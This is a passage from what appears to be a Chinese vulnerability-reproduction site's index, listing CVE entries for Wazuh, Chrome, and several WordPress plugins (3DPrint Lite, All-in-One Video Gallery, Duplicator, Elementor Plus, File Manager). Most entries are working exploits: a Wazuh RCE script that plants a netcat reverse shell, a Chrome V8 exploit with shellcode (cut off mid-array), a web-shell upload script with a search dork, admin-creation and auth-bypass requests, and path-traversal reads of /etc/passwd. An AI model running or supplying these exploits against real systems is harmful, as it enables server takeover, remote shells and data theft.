print(\"\\033[31m[x] 请求失败 \\033[0m\") exit() except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/:5:0","tags":null,"title":"","uri":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/"},{"categories":null,"content":"Wazuh Manager 代码执行漏洞CVE-2021-26814 ","date":"0001-01-01","objectID":"/wazuh-manager-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26814/:0:0","tags":null,"title":"","uri":"/wazuh-manager-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26814/"},{"categories":null,"content":"漏洞描述 Wazuh 从4.0.0到4.0.3的 Wazuh API允许经过身份验证的用户通过/manager/files URI以管理权限执行任意代码。 ","date":"0001-01-01","objectID":"/wazuh-manager-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26814/:1:0","tags":null,"title":"","uri":"/wazuh-manager-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26814/"},{"categories":null,"content":"漏洞影响 Wazuh Manager v.4.0.0-4.0.3 ","date":"0001-01-01","objectID":"/wazuh-manager-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26814/:2:0","tags":null,"title":"","uri":"/wazuh-manager-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26814/"},{"categories":null,"content":"漏洞复现 poc： PoC.py [-h] -user USERNAME -pwd PASSWORD -lip SRCIP -lport SRCPORT -tip DESTIP -tport DESTPORT # Exploit Title: Wazuh 4.0.3 API RCE # Author: WickdDavid (Davide Meacci) # Date: 2021-01-01 # Vendor Homepage: https://github.com/wazuh/wazuh # Version : 4.0.3 import requests import sys import argparse import time import json from urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning) parser = argparse.ArgumentParser(description='Wazuh-manager authenticated RCE by WickdDavid') parser.add_argument('-user', dest='username',required=True, help='wazuh API username') parser.add_argument('-pwd', dest='password',required=True, help='wazuh API password') parser.add_argument('-lip', dest='srcip',required=True, help='listening server') parser.add_argument('-lport', dest='srcport',required=True, help='listening port') parser.add_argument('-tip', dest='destip',required=True, help='target server ip (wazuh API)') parser.add_argument('-tport', dest='destport',required=True, help='target server port (wazuh API)') args = parser.parse_args() # executed payload may be changed here exec_payload = \"\"\" import os #:l os.system(\"nc %s %s -e /bin/sh\") #:l \"\"\" % (args.srcip, args.srcport) config_payload = { \"drop_privileges\": False } proxies = { \"http\":\"http://127.0.0.1:8080\", \"https\":\"https://127.0.0.1:8080\" } target = \"https://%s:%s\" % (args.destip,args.destport) auth_token = \"\" path_traversal = \"etc/lists/../../../../..\" headers = {} # step 1 - obtaining auth token r = requests.get(\"%s/security/user/authenticate?raw=true\" % target, auth=(args.username, args.password),verify=False) if(r.status_code == 200): auth_token = r.text headers[\"Authorization\"] = \"Bearer %s\" % auth_token else: print(\"[!] No auth code recovered. Check username and password\") exit(1) # step 2 - Privilege Escalation on API (not implemented) # step 3 - Save files to be restored later file_to_overwrite = \"/var/ossec/api/scripts/wazuh-apid.py\" print(\"[+] Saving files to restore later...\") r = requests.get(\"%s/manager/files?path=%s%s\" % (target,path_traversal,file_to_overwrite), headers = headers, verify=False) f = open(\"backup.py\",\"w\") f.write(json.loads(r.text)[\"contents\"]) f.close() time.sleep(1) # step 4 - Local Privilege Escalation print(\"[+] Changing API config to run as root...\") r = requests.put(\"%s/manager/api/config\" % target, headers = headers, json = config_payload, verify=False) time.sleep(1) # step 5 - Restart server (now api service runs as root) print(\"[+] Restarting server...\") r = requests.put(\"%s/manager/restart?wait_for_complete=true\" % target, headers = headers,verify=False) #print(r.text) data = {\"title\":\"Bad Request\"} while \"title\" in data and \"Bad request\" in data[\"title\"]: time.sleep(5) try: r = requests.get(\"%s/manager/status\" % target, headers = headers, verify=False) #print(r.text) data = json.loads(r.text) except: continue # step 6 - Overwrite /var/ossec/api/scripts/wazuh-apid.py with malicious python payload print(\"[+] Uploading payload...\") r = requests.put(\"%s/manager/files?path=%s%s\u0026overwrite=true\" % (target,path_traversal,file_to_overwrite), headers = headers, data = exec_payload, verify=False) #print(r.text) time.sleep(1) # step 7 - Restart server (now malicious payload will be run by the server) print(\"[+] Restarting API service for the last time...\") r = requests.put(\"%s/manager/restart?wait_for_complete=true\" % target, headers = headers,verify=False) #print(r.text) data = {\"title\":\"Bad Request\"} while \"title\" in data and \"Bad request\" in data[\"title\"]: time.sleep(5) try: r = requests.get(\"%s/manager/status\" % target, headers = headers, verify=False) #print(r.text) data = json.loads(r.text) except: continue print(\"[+] Payload executed, check your shell now.\") print(\"[+] Remember to restore changed file (check local backup file)\") ","date":"0001-01-01","objectID":"/wazuh-manager-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26814/:3:0","tags":null,"title":"","uri":"/wazuh-manager-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26814/"},{"categories":null,"content":"Windows Chrome 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/windows-chrome-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/windows-chrome-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Windows Chrome 0day 在 2021-4-13 被公开 该漏洞未绕过沙箱，需要关闭沙箱才能成功弹出计算器 # 关闭沙箱 右键图标--\u003e属性，然后在目标后面加上 -no-sandbox 点击确认 ","date":"0001-01-01","objectID":"/windows-chrome-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/windows-chrome-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Window Chrome 浏览器 ","date":"0001-01-01","objectID":"/windows-chrome-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/windows-chrome-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 Github： https://github.com/r4j0x00/exploits/tree/master/chrome-0day 推特: https://twitter.com/r4j0x00/status/1381643526010597380?s=12 exp.html \u003cscript src=\"exploit.js\"\u003e\u003c/script\u003e exp.js /* /* BSD 2-Clause License Copyright (c) 2021, rajvardhan agarwal All rights reserved. Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */ var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]) var wasm_mod = new WebAssembly.Module(wasm_code); var wasm_instance = new WebAssembly.Instance(wasm_mod); var f = wasm_instance.exports.main; var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); let buf2 = new ArrayBuffer(0x150); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u003c\u003c 32n); } function itof(val) { u64_buf[0] = Number(val \u0026 0xffffffffn); u64_buf[1] = Number(val \u003e\u003e 32n); return f64_buf[0]; } const _arr = new Uint32Array([2**31]); function foo(a) { var x = 1; x = (_arr[0] ^ 0) + 1; x = Math.abs(x); x -= 2147483647; x = Math.max(x, 0); x -= 1; if(x==-1) x = 0; var arr = new Array(x); arr.shift(); var cor = [1.1, 1.2, 1.3]; return [arr, cor]; } for(var i=0;i\u003c0x3000;++i) foo(true); var x = foo(false); var arr = x[0]; var cor = x[1]; const idx = 6; arr[idx+10] = 0x4242; function addrof(k) { arr[idx+1] = k; return ftoi(cor[0]) \u0026 0xffffffffn; } function fakeobj(k) { cor[0] = itof(k); return arr[idx+1]; } var float_array_map = ftoi(cor[3]); var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4]; var fake = fakeobj(addrof(arr2) + 0x20n); function arbread(addr) { if (addr % 2n == 0) { addr += 1n; } arr2[1] = itof((2n \u003c\u003c 32n) + addr - 8n); return (fake[0]); } function arbwrite(addr, val) { if (addr % 2n == 0) { addr += 1n; } arr2[1] = itof((2n \u003c\u003c 32n) + addr - 8n); fake[0] = itof(BigInt(val)); } function copy_shellcode(addr, shellcode) { let dataview = new DataView(buf2); let buf_addr = addrof(buf2); let backing_store_addr = buf_addr + 0x14n; arbwrite(backing_store_addr, addr); for (let i = 0; i \u003c shellcode.length; i++) { dataview.setUint32(4*i, shellcode[i], true); } } var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n)); console.log(\"[+] Address of rwx page: \" + rwx_page_addr.toString(16)); var shellcode = [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,323808","date":"0001-01-01","objectID":"/windows-chrome-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/windows-chrome-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"WordPress 3DPrint Lite 3dprint-lite-functions.php 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/wordpress-3dprint-lite-3dprint-lite-functions.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/wordpress-3dprint-lite-3dprint-lite-functions.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 WordPress 3DPrint Lite Version 1.9.1.4 版本 中的 3dprint-lite-functions.php 文件存在文件上传漏洞，攻击者通过构造请求包可以上传任意文件获取服务器权限 ","date":"0001-01-01","objectID":"/wordpress-3dprint-lite-3dprint-lite-functions.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/wordpress-3dprint-lite-3dprint-lite-functions.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 3DPrint Lite Version 1.9.1.4 版本 ","date":"0001-01-01","objectID":"/wordpress-3dprint-lite-3dprint-lite-functions.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/wordpress-3dprint-lite-3dprint-lite-functions.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"插件名 3DPrint Lite https://downloads.wordpress.org/plugin/3dprint-lite.1.9.1.4.zip ","date":"0001-01-01","objectID":"/wordpress-3dprint-lite-3dprint-lite-functions.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/wordpress-3dprint-lite-3dprint-lite-functions.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 首先看一下插件注册的接口 if ( is_admin() ) { add_action( 'admin_enqueue_scripts', 'p3dlite_enqueue_scripts_backend' ); add_action( 'wp_ajax_p3dlite_handle_upload', 'p3dlite_handle_upload' ); add_action( 'wp_ajax_nopriv_p3dlite_handle_upload', 'p3dlite_handle_upload' ); include 'includes/3dprint-lite-admin.php'; } else { add_action( 'wp_enqueue_scripts', 'p3dlite_enqueue_scripts_frontend' ); include 'includes/3dprint-lite-frontend.php'; } 跟踪 p3dlite_handle_upload 方法 wp-content/plugins/3dprint-lite/includes/3dprint-lite-functions.php 向下看可以看到一个标准的文件上传代码 通过调试可以找到上传路径 /wp-content/uploads/p3d/ 未授权调用 p3dlite_handle_upload 上传文件 # Exploit Title: Wordpress Plugin 3DPrint Lite 1.9.1.4 - Arbitrary File Upload # Google Dork: inurl:/wp-content/plugins/3dprint-lite/ # Date: 22/09/2021 # Exploit Author: spacehen # Vendor Homepage: https://wordpress.org/plugins/3dprint-lite/ # Version: \u003c= 1.9.1.4 # Tested on: Ubuntu 20.04.1 import os.path from os import path import json import requests; import sys def print_banner(): print(\"3DPrint Lite \u003c= 1.9.1.4 - Arbitrary File Upload\") print(\"Author -\u003e spacehen (www.github.com/spacehen)\") def print_usage(): print(\"Usage: python3 exploit.py [target url] [php file]\") print(\"Ex: python3 exploit.py https://example.com ./shell.php\") def vuln_check(uri): response = requests.get(uri) raw = response.text if (\"jsonrpc\" in raw): return True; else: return False; def main(): print_banner() if(len(sys.argv) != 3): print_usage(); sys.exit(1); base = sys.argv[1] file_path = sys.argv[2] ajax_action = 'p3dlite_handle_upload' admin = '/wp-admin/admin-ajax.php'; uri = base + admin + '?action=' + ajax_action ; check = vuln_check(uri); if(check == False): print(\"(*) Target not vulnerable!\"); sys.exit(1) if( path.isfile(file_path) == False): print(\"(*) Invalid file!\") sys.exit(1) files = {'file' : open(file_path)} print(\"Uploading Shell...\"); response = requests.post(uri, files=files) file_name = path.basename(file_path) if(file_name in response.text): print(\"Shell Uploaded!\") if(base[-1] != '/'): base += '/' print(base + \"wp-content/uploads/p3d/\" + file_name); else: print(\"Shell Upload Failed\") sys.exit(1) main(); ","date":"0001-01-01","objectID":"/wordpress-3dprint-lite-3dprint-lite-functions.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/wordpress-3dprint-lite-3dprint-lite-functions.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"WordPress All-in-One Video Gallery video.php 任意文件读取漏洞 CVE-2022-2633 ","date":"0001-01-01","objectID":"/wordpress-all-in-one-video-gallery-video.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-2633/:0:0","tags":null,"title":"","uri":"/wordpress-all-in-one-video-gallery-video.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-2633/"},{"categories":null,"content":"漏洞描述 WordPress All-in-One Video 插件 Gallery video.php文件中存在SSRF以及任意文件读取漏洞，攻击者通过发送特定的请求包读取任意文件 ","date":"0001-01-01","objectID":"/wordpress-all-in-one-video-gallery-video.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-2633/:1:0","tags":null,"title":"","uri":"/wordpress-all-in-one-video-gallery-video.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-2633/"},{"categories":null,"content":"漏洞影响 WordPress All-in-One Video Gallery \u003c= 2.6.0 ","date":"0001-01-01","objectID":"/wordpress-all-in-one-video-gallery-video.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-2633/:2:0","tags":null,"title":"","uri":"/wordpress-all-in-one-video-gallery-video.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-2633/"},{"categories":null,"content":"插件名称 All-in-One Video Gallery https://downloads.wordpress.org/plugin/all-in-one-video-gallery.2.6.0.zip ","date":"0001-01-01","objectID":"/wordpress-all-in-one-video-gallery-video.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-2633/:3:0","tags":null,"title":"","uri":"/wordpress-all-in-one-video-gallery-video.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-2633/"},{"categories":null,"content":"漏洞复现 对比漏洞修复的文件找到出现漏洞的文件 wp-content/plugins/all-in-one-video-gallery/public/video.php 这里接收 dl 参数，dl 参数不为 数字类型时，参数将 base64 解码传入 if ( is_numeric( $_GET['dl'] ) ) { $file = get_post_meta( (int) $_GET['dl'], 'mp4', true ); } else { $file = base64_decode( $_GET['dl'] ); } if ( empty( $file ) ) { die( esc_html__( 'Download file URL is empty.', 'all-in-one-video-gallery' ) ); exit; } 当传入的参数中不存在 http:// 或 https:// 时，参数 $formatted_path 的值改变 当 $formatted_path 为 url 时存在 SSRF漏洞，传入 base64编码 的目标URL就可以得到回显 /index.php/video/?dl=aHR0cHM6Ly93d3cuYmFpZHUuY29t 看向代码最后的片段，则存在任意文件读取漏洞 /index.php/video/?dl=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA== ","date":"0001-01-01","objectID":"/wordpress-all-in-one-video-gallery-video.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-2633/:4:0","tags":null,"title":"","uri":"/wordpress-all-in-one-video-gallery-video.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-2633/"},{"categories":null,"content":"WordPress Duplicator duplicator.php 任意文件读取漏洞 CVE-2020-11738 ","date":"0001-01-01","objectID":"/wordpress-duplicator-duplicator.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11738/:0:0","tags":null,"title":"","uri":"/wordpress-duplicator-duplicator.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11738/"},{"categories":null,"content":"漏洞描述 WordPress Duplicator插件由于对文件下载没有进行验证，则导致了任意文件读取漏洞 ","date":"0001-01-01","objectID":"/wordpress-duplicator-duplicator.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11738/:1:0","tags":null,"title":"","uri":"/wordpress-duplicator-duplicator.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11738/"},{"categories":null,"content":"漏洞影响 Duplicator \u003c= v1.3.26 ","date":"0001-01-01","objectID":"/wordpress-duplicator-duplicator.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11738/:2:0","tags":null,"title":"","uri":"/wordpress-duplicator-duplicator.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11738/"},{"categories":null,"content":"插件名 Duplicator https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip ","date":"0001-01-01","objectID":"/wordpress-duplicator-duplicator.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11738/:3:0","tags":null,"title":"","uri":"/wordpress-duplicator-duplicator.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11738/"},{"categories":null,"content":"漏洞复现 首先先查看注册的无需授权的action接口 wp-content/plugins/duplicator/ctrls/class.web.services.php 这里 wp_ajax_nopriv_duplicator_download 对应的函数名为 duplicator_download public static function duplicator_download() { $file = sanitize_text_field($_GET['file']); $filepath = DUPLICATOR_SSDIR_PATH.'/'.$file; // Process download if(file_exists($filepath)) { // Clean output buffer if (ob_get_level() !== 0 \u0026\u0026 @ob_end_clean() === FALSE) { @ob_clean(); } header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=\"'.basename($filepath).'\"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($filepath)); flush(); // Flush system output buffer try { $fp = @fopen($filepath, 'r'); if (false === $fp) { throw new Exception('Fail to open the file '.$filepath); } while (!feof($fp) \u0026\u0026 ($data = fread($fp, DUPLICATOR_BUFFER_READ_WRITE_SIZE)) !== FALSE) { echo $data; } @fclose($fp); } catch (Exception $e) { readfile($filepath); } exit; } else { wp_die('Invalid installer file name!!'); } } 可以看到这里接受参数 file，拼接至 $filepath 中，通过调试可以得知 DUPLICATOR_SSDIR_PATH 为 wp-snapshots 目录，file可控且没有过滤，导致任意文件读取 /wp-admin/admin-ajax.php?action=duplicator_download\u0026file=../../../../../etc/passwd ","date":"0001-01-01","objectID":"/wordpress-duplicator-duplicator.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11738/:4:0","tags":null,"title":"","uri":"/wordpress-duplicator-duplicator.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11738/"},{"categories":null,"content":"WordPress Elementor Page Builder Plus 身份验证绕过 CVE-2021-24175 ","date":"0001-01-01","objectID":"/wordpress-elementor-page-builder-plus-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-24175/:0:0","tags":null,"title":"","uri":"/wordpress-elementor-page-builder-plus-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-24175/"},{"categories":null,"content":"漏洞描述 未经身份验证的用户可以使用\"theplus_ajax_login\"和\"theplus_google_ajax_register\" Ajax请求，通过仅提供相关的用户名，就可以像任何用户一样轻松地进行身份验证。 参考链接： https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24175 https://wpscan.com/vulnerability/c311feef-7041-4c21-9525-132b9bd32f89 ","date":"0001-01-01","objectID":"/wordpress-elementor-page-builder-plus-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-24175/:1:0","tags":null,"title":"","uri":"/wordpress-elementor-page-builder-plus-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-24175/"},{"categories":null,"content":"漏洞影响 Elementor Page Builder \u003c4.1.7 ","date":"0001-01-01","objectID":"/wordpress-elementor-page-builder-plus-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-24175/:2:0","tags":null,"title":"","uri":"/wordpress-elementor-page-builder-plus-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-24175/"},{"categories":null,"content":"漏洞复现 poc： curl -X POST --data action=theplus_ajax_login --data email=admin -iLSS https://example.com/wp-admin/admin-ajax.php curl -X POST --data action=theplus_google_ajax_register --data email=admin --data nonce=a -iLSS https://example.com/wp-admin/admin-ajax.php “theplus_google_ajax_register” AJAX请求还可以允许任何未经身份验证的用户创建具有任意角色的帐户，例如admin，然后登录。 html： \u003cform method=\"POST\" action=\"https://example.com/wp-admin/admin-ajax.php\"\u003e \u003cinput value=\"newadmin\" name=\"name\" type=\"text\"\u003e \u003cinput value=\"test@example.com\" name=\"email\" type=\"text\"\u003e \u003cinput value=\"test\" name=\"password\" type=\"text\"\u003e \u003cinput value=\"theplus_google_ajax_register\" name=\"action\" type=\"text\"\u003e \u003cinput value=\"administrator\" name=\"tp_user_reg_role\" type=\"text\"\u003e \u003cinput value=\"any\" name=\"nonce\" type=\"text\"\u003e \u003cinput type=\"submit\" /\u003e \u003c/form\u003e ","date":"0001-01-01","objectID":"/wordpress-elementor-page-builder-plus-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-24175/:3:0","tags":null,"title":"","uri":"/wordpress-elementor-page-builder-plus-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-24175/"},{"categories":null,"content":"WordPress File Manager＜6.9 RCE CVE-2020-25213 ","date":"0001-01-01","objectID":"/wordpress-file-manager6.9-rce-cve-2020-25213/:0:0","tags":null,"title":"","uri":"/wordpress-file-manager6.9-rce-cve-2020-25213/"},{"categories":null,"content":"漏洞复现 poc： curl -ks --max-time 5 -F \"reqid=17457a1fe6959\" -F \"cmd=upload\" -F \"target=l1_Lw\" -F \"mtime[]=1576045135\" -F \"upload[]=@/$file_upload\" \"hxxps://victim.com/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\" POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1 Content-Length: 631 Content-Type: multipart/form-data; boundary=------------------------9689147a5989a801 Connection: close --------------------------9689147a5989a801 Content-Disposition: form-data; name=\"reqid\" 17457a1fe6959 --------------------------9689147a5989a801 Content-Disposition: form-data; name=\"cmd\" upload --------------------------9689147a5989a801 Content-Disposition: form-data; name=\"target\" l1_Lw --------------------------9689147a5989a801 Content-Disposition: form-data; name=\"mtime[]\" 1576045135 --------------------------9689147a5989a801 Content-Disposition: form-data; name=\"upload[]\"; filename=\"1.php\" Content-Type: application/octet-stream \u003c?php phpinfo();?\u003e --------------------------9689147a5989a801-- ","date":"0001-01-01","objectID":"/wordpress-file-manager6.9-rce-cve-2020-25213/:1:0","tags":null,"title":"","uri":"/wordpress-file-manager6.9-rce-cve-2020-25213/"},{"categories":null,"content":"WordPress Redux Framework class-redux-helpers.php 敏感信息泄漏漏洞 CVE-2021-38314 